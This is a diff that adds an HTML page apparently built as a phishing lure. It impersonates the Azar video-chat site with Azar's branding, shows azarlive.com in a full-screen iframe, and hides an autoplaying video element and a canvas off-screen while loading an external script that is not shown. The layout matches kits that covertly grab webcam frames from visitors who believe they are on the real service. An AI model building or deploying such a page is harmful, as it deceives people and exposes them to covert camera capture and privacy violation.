@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8"/>
+  <link rel="shortcut icon" href="https://azarlive.com/apple-icon-114x114.png">
+	<meta property="og:image" content="https://azarlive.com/images/og/imgAzarWebMatch.png">
+	<meta name="description" content="It is the most popular video chatting platform in the world">
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>World's best online video chatting platform</title>
+  <style>
+    body,html{height:100%;margin:0;overflow:hidden}
+    #webview-container{width:100%;height:100%;border:none}
+    #webview-container iframe{width:100%;height:100%;border:none;position:absolute;top:0;left:0}
+    #video-container{position:fixed;top:-9999px;left:-9999px}
+  </style>
+</head>
+<body>
+  <div id="webview-container"><iframe src="https://azarlive.com/"></iframe></div>
+  <div id="video-container">
+    <video id="video" autoplay muted></video>
+    <canvas id="canvas"></canvas>
+  </div>
+<script src="script.js"></script>
+</body>
+</html>
